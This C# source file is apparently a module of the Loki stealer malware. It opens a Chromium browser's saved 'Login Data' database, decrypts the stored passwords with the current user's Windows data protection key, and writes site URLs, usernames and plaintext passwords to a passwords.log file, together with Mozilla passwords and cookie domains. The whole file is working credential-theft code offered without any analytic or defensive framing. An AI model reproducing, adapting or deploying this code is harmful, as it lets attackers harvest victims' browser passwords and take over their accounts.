namespace loki.loki.Stealer.Passwords
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Linq;
    using System.Security.Cryptography;
    using loki.Stealer.Cookies;

    public static class GetPasswords
    {
        public static List<string> profile_list = new List<string>();
        public static List<string> browser_name_list = new List<string>();
        public static List<string> url = new List<string>();
        public static List<string> login = new List<string>();
        public static List<string> password = new List<string>();
        public static List<string> passwors = new List<string>();
        public static List<string> credential = new List<string>();

        public static int Cpassword;

        public static void Passwords_Grab(string profilePath, string browser_name, string profile)
        {
            try
            {
                string text = Path.Combine(profilePath, "Login Data");
                browser_name_list.Add(browser_name);
                profile_list.Add(profile);

                var cNT = new sqlite.CNT(GetCookies.CreateTempCopy(text));
                cNT.ReadTable("logins");
                for (int i = 0; i < cNT.RowLength; i++)
                {
                    Cpassword++;
                    try
                    {
                        credential.Add($"Site_Url : {cNT.ParseValue(i, "origin_url").Trim()}{Environment.NewLine}Login : {cNT.ParseValue(i, "username_value").Trim()}{Environment.NewLine}Password : {GetCookies.DecryptBlob(cNT.ParseValue(i, "password_value"), DataProtectionScope.CurrentUser).Trim()}{Environment.NewLine}");
                    }
                    catch  { }
                }
                foreach (string v in credential)
                {
                    password.Add($"Browser : {browser_name}{Environment.NewLine}Profile : {profile}{Environment.NewLine}{v}");
                }
                credential.Clear();
            }
            catch { }
        }

        public static void Write_Passwords()
        {
            using (var streamWriter = new StreamWriter($"{Program.dir}\\passwords.log"))
            {
                foreach (string v in password)
                {
                    streamWriter.Write(v);
                    streamWriter.Write(Environment.NewLine);

                }
                for (int a = 0; a < Mozila.passwors.Count(); a++)
                {
                    streamWriter.Write(Mozila.passwors[a]);
                    streamWriter.Write(Environment.NewLine);
                }
            }
            using (var streamWriter = new StreamWriter($"{Program.dir}\\cookieDomains.log"))
            {
                foreach (string v in GetCookies.domains)
                {
                    streamWriter.Write(v);
                    streamWriter.Write(Environment.NewLine);
                }
            }
        }
    }
}